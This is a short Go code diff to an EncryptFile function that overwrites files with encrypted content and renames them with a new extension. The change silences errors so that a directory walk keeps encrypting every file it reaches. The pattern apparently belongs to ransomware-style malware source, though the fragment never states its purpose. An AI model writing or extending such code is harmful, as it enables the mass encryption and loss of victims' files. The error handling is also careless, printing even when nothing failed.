@@ -66,19 +66,23 @@ func EncryptFile(path string, key []byte) error {
 
 	data, err := ioutil.ReadFile(path)
 	if err != nil {
-		return err
+		//Think of a fix, if the error isn't nil the walk function exits, so we return nil even on errors
+		fmt.Println(err)
+		return nil
 	}
 	data = Encrypt(key, data)
 	err = ioutil.WriteFile(path, data, 0644)
 	if err != nil {
-		return err
+		fmt.Println(err)
+		return nil
 	}
 
 	var sb strings.Builder
 	sb.WriteString(path)
 	sb.WriteString(extension)
 	err = os.Rename(path, sb.String())
-	return err
+	fmt.Println(err)
+	return nil
 }
 
 func DecryptFile(path string, key []byte) error {
